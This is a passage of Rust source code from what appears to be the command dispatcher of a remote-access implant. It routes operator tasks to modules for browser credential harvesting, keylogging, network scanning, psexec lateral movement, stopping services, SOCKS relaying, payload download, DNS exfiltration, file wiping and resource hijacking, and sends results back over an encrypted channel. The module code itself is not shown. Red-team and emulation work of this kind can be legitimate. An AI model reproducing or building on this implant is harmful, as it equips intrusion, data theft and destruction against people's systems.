                        Err(_) => b"Screenshot failed".to_vec(),
                    };
                    result = Some(SensitiveData::new(&msg));
                }
                "browser" => {
                    let res = crate::modules::browser::Browser.harvest();
                    let msg = match res {
                        Ok(data) => data,
                        Err(_) => b"Browser harvesting failed".to_vec(),
                    };
                    result = Some(SensitiveData::new(&msg));
                }
                "net_scan" => {
                    result = Some(crate::modules::discovery::Discovery.net_scan(&task.payload));
                }
                "psexec" => {
                    let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
                    if parts.len() == 3 {
                        let res =
                            crate::modules::lateral::Lateral.psexec(parts[0], parts[1], parts[2]);
                        let msg = if res.is_ok() {
                            b"Service created" as &[u8]
                        } else {
                            b"Failed" as &[u8]
                        };
                        result = Some(SensitiveData::new(msg));
                    }
                }
                "service_stop" => {
                    let res = crate::modules::lateral::Lateral.service_stop(&task.payload);
                    let msg = if res.is_ok() {
                        b"Service stopped" as &[u8]
                    } else {
                        b"Failed" as &[u8]
                    };
                    result = Some(SensitiveData::new(msg));
                }
                "sideload_scan" => {
                    result = Some(crate::modules::sideload::SideLoad.scan());
                }
                "keylogger" => {
                    result = crate::modules::collection::Collection.keylogger_poll();
                }
                "mesh_relay" => {
                    let packet = hex_decode(&task.payload);
                    let mut res_vec = Vec::new();
                    if let Some(proxy) = unsafe { (*core::ptr::addr_of_mut!(SOCKS_PROXY)).as_mut() }
                    {
                        res_vec = proxy.process(&packet);
                    }
                    result = Some(SensitiveData::new(&res_vec));
                    res_vec.zeroize();
                }
                "compress" => {
                    let data = hex_decode(&task.payload);
                    let compressed = crate::modules::compression::Compression.compress(&data);
                    result = Some(SensitiveData::new(&compressed));
                }
                "decode_xor" => {
                    let parts: Vec<&str> = task.payload.splitn(2, ' ').collect();
                    if parts.len() == 2 {
                        let data = hex_decode(parts[0]);
                        let key = parts[1].parse::<u8>().unwrap_or(0);
                        result = Some(crate::modules::transform::Transform.decode_xor(&data, key));
                    }
                }
                "decode_base64" => {
                    result = Some(crate::modules::transform::Transform.decode_base64(task.payload.as_bytes()));
                }
                "download" => {
                    result = Some(crate::modules::ingress::Ingress.download_http(&task.payload));
                }
                "exfil_dns" => {
                    let parts: Vec<&str> = task.payload.splitn(2, ' ').collect();
                    if parts.len() == 2 {
                        let data = hex_decode(parts[0]);
                        let domain = parts[1];
                        let res = crate::modules::exfiltration::Exfiltration
                            .exfiltrate_dns(&data, domain);
                        let msg = if res.is_ok() {
                            b"Exfiltration started" as &[u8]
                        } else {
                            b"Exfiltration failed" as &[u8]
                        };
                        result = Some(SensitiveData::new(msg));
                    }
                }
                "wipe" => {
                    let res = crate::modules::impact::Impact.wipe_file(&task.payload);
                    let msg = if res.is_ok() {
                        b"File wiped" as &[u8]
                    } else {
                        b"Wipe failed" as &[u8]
                    };
                    result = Some(SensitiveData::new(msg));
                }
                "hijack" => {
                    let duration = task.payload.parse::<u32>().unwrap_or(1000);
                    crate::modules::impact::Impact.hijack_resources(duration);
                    result = Some(SensitiveData::new(
                        b"Resource hijacking simulation complete",
                    ));
                }
                _ => {}
            }

            if let Some(sensitive) = result {
                if let Some(guard) = sensitive.unlock() {
                    let frame = WraithFrame::new(FRAME_TYPE_DATA, guard.to_vec());
                    if let Ok(msg_to_send) = session.write_message(&frame.serialize()) {
                        let _ = transport.request(&msg_to_send);
                    }
                }
            }
        }
    }
}
